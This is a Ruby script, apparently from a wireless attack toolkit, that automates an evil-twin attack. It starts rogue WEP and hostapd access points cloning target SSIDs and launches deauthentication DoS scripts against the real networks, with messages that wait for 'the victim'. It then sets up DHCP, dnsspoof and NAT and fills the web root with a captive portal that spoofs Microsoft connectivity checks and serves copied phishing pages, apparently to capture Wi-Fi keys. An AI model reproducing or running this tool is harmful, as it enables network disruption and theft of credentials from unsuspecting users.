#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'
require 'monitor'
require 'shellwords'
require './dosbis'








class Combo
   def self.rogueWep
load 'wepbis.rb'
      puts "\e[1;32m[*] Starting airbase-ng as a WEP network again SSID 1.\e[0m"
      system "airmon-ng start #{$carte}"
sleep 5
      system "airbase-ng -c #{$canal} --essid #{"#$ssid ".shellescape} -N -W 1 #{$carte}mon &"
sleep 5
system "x-terminal-emulator -e airodump-ng -c #{$canal} -d #{$mac} -w hirte #{$carte}mon"
sleep 4
      puts "\e[1;94m[*] Waiting for the victim...\e[0m"
load 'accessdos.rb'
puts "Starting your second wifi-card..."
system "airmon-ng start #{$cartedos}"
sleep 5
puts "\e[1;94m[*] DoS for SSID 1 will start now...\e[0m"
dos = Thread.new { `bash rundos.sh` }
sleep 2
      puts "\e[1;32m[*] Starting airbase-ng as a WEP network again SSID 2.\e[0m"
      system "airbase-ng -c #{$apcanalbis} --essid #{"#$ssidbis ".shellescape} -N -W 1 #{$cartedos}mon &"
sleep 5
system "x-terminal-emulator -e airodump-ng -c #{$apcanalbis} -d #{$adressmac2} -w hirte #{$cartedos}mon"
sleep 4
      puts "\e[1;94m[*] Waiting for the victim...\e[0m"
puts "\e[1;94m[*] DoS for SSID 2 will start now...\e[0m"
dosbis = Thread.new { `bash rundosbis.sh` }
   end



  def self.multiOpen
load 'checkbis.rb'
      `touch /tmp/hostbase-1.1/dhcpd.conf`
      `touch /tmp/hostapd.conf`
      `ifconfig wlan0 down`
      sleep 2
      `ifconfig wlan0 hw ether a4:c4:94:31:93:70`
      sleep 1
      `ifconfig wlan0 up`
      sleep 2
      Dir.chdir '/tmp/hostbase-1.1'
sleep 1
`cat <<-EOF > /tmp/hostapd.conf
interface=wlan0
bssid=a4:c4:94:31:93:70
driver=nl80211
ssid=#{$ssid} 
hw_mode=g
ieee80211n=1
channel=#{$canal}
# 2e AP
bss=wlan1
bssid=a4:c4:94:31:93:71
ssid=#{$ssidbis} 
channel=#{$canal}
EOF`
sleep 3
`cat <<-EOF > /tmp/hostbase-1.1/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface wlan0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
subnet 172.0.0.0 netmask 255.255.255.0 {
interface wlan1;
range 172.0.0.2 172.0.0.10;
option routers 172.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 172.0.0.1;
allow unknown-clients;
}
EOF`
sleep 2
        system "hostapd /tmp/hostapd.conf >> /tmp/hostbase-1.1/hostapd.txt &"
sleep 4
hostapdcli = Thread.new do
  while true
    system "xterm -e hostapd_cli wps_pbc"   # On lance hostapd_cli wps_pbc en tant que thread
sleep(120)     # Temps avant la relance de la commande
  end
end
Fatal.comboPhish # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end



class Fatal
def self.comboPhish
load 'page.rb'
puts "Configuting the multi AP's..."
`ifconfig wlan0 up`
`sysctl net.ipv4.ip_forward=1`
         `sudo ifconfig wlan0 175.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1`
         `ifconfig wlan1 up`
         `sudo ifconfig wlan1 172.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 172.0.0.0 netmask 255.255.255.0 gw 172.0.0.1`
         sleep 1
         `iptables --flush`
         `iptables --table nat --flush`
         `iptables --delete-chain`
         `iptables --table nat --delete-chain`
         sleep 2
         `iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE`
         `iptables -A FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT`
         `iptables -t nat -A POSTROUTING -o wlan0 -j SNAT --to 175.0.0.1`
         sleep 2
`echo > '/tmp/hostbase-1.1/dhcpd.leases'`
piddhcp = spawn('dhcpd -d -f -lf /tmp/hostbase-1.1/dhcpd.leases -cf /tmp/hostbase-1.1/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i wlan0 &')
sleep 1
piddnsspoof = spawn('dnsspoof -i wlan1 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
puts "\e[1;94m[*] Configuracion del systemo de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3
`cp -R /etc/#{$pagebis}/* /var/www/msftconnecttest/`
sleep 3
`chown -R root:apache /var/www/*`
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:apache /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Rogue AP creado... preparacion de la DoS activa que sigue el AP...\e[0m"
Dir.chdir '/tmp/hostbase-1.1'
sleep 1 
Start.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Rogue AP creado... preparacion de la DoS activa que sigue el AP...\e[0m"
Dir.chdir '/tmp/hostbase-1.1'
sleep 1 
Start.interface # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end
end
